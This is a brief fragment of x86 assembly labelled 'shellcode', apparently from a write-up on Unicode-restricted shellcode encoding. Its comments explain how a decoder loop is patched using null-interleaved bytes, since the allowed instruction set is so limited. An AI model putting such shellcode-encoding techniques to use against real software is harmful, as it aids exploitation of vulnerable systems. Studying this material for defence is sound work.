...
shellcode:
    ...
    ; start patching. Assuming EDI points to the baseaddress of this code,
    ; the decoder loop will be around EDI+0x100. Since our limited instruction
    ; set does not include a direct way to add a value to a register, we have
    ; to do this in another way:
    PUSH    EDI                         ;                        > A4A3A2A1
                    db 0x00, 0x57, 0x00 ;NOP - ADD [EDI+0], DL
